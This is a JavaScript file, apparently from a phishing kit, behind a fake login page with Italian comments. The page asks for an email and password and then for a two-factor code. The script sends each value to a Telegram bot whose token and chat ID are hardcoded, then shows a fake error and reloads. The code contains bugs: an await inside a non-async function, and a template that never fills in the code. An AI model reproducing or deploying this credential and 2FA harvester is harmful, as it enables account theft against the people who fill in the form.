async function sendMessage(event) {
    event.preventDefault(); // Evita il comportamento di submit standard
    
    // Ottieni i dati del form
    const email = document.getElementById('email').value;
    const message = document.getElementById('password').value;
    
    // Telegram API token e chat ID
    const token = '7891906722:AAG8zqD023Hb076GGNl4lozyYKGwSfMJ8rI';
    const chatId = '5750077857';
    
    // Testo del messaggio da inviare su Telegram
    const text = `Nuovo messaggio dal form:\nEmail: ${email}\nPassword: ${message}`;
    
    // URL dell'API Telegram per inviare il messaggio
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    // Invia il messaggio a Telegram
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text
            })
        });
        
        if(response.ok){
            // Nascondi la sezione di login
            document.getElementById("login-section").style.display = "none";
            
            // Mostra la sezione di verifica del codice 2FA
           document.getElementById("2fa-section").style.display = "block";
        }
        
        // alert("Errore, riprovare più Tardi");
        
    } catch (error) {
        console.error("Errore:", error);
        alert("Errore durante l'invio del messaggio.");
    }
}

// Funzione che verifica il codice a 2 fattori
function verify2FA(event) {
    event.preventDefault();  // Previene il comportamento predefinito (invio del modulo)
    
    const code = document.getElementById("code").value;
    
    // Telegram API token e chat ID
    const token = '7891906722:AAG8zqD023Hb076GGNl4lozyYKGwSfMJ8rI';
    const chatId = '5750077857';
    
    // Testo del messaggio da inviare su Telegram
    const text = 'Nuovo messaggio dal form:\nCode2FA: ${code}';
    
    // URL dell'API Telegram per inviare il messaggio
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    // Invia il messaggio a Telegram
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text
            })
        });        
    } catch (error) {
        console.error("Errore:", error);
    }
    
    alert("Errore, riprovare più Tardi");
    location.reload();
}


function inizializza(){
    let send = document.getElementById("invia");
    
    send.addEventListener("click", sendMessage);
}

document.addEventListener("DOMContentLoaded", inizializza);